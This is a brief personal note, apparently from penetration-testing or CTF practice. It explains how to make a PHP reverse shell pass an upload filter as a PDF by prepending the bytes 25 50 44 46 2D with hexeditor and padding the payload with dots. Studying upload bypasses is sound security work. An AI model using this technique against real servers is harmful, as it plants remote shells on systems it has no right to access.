Magic Bytes
Successfully use magic bytes to fool an upload function into thinking php-reverse-shell.php is .pdf

└─$ hexeditor -b php-reverse-shell.php   <--- Ended up putting in  25 50 44 46 2D (PDF) 

https://en.wikipedia.org/wiki/List_of_file_signatures  <-- Find signatures other than pdf

I added an additional ..... (five) dots so the php payload does not get affected by inserting 25 50 44 46 2D via hexeditor -b, dont forget the -b 
.....<?php <-- Add ..... before the php payload so when you go into hexeditor and add 25 50 44 46 2D at the beginning the php payload will not be affected.
